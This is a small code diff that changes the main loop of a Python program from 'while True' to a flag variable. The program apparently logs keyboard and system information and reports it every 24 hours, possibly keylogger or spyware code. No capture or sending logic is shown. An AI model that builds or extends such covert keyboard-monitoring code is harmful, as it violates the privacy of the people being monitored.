@@ -70,7 +70,8 @@ def main():
     report_interval = 86400 #86400 is 24 hours in secs
     start_logger()
 
-    while True:
+    Life = True;
+    while Life:
         try:
             sys_info = gather_system_info()
             keyboard_info = keyboard_info()
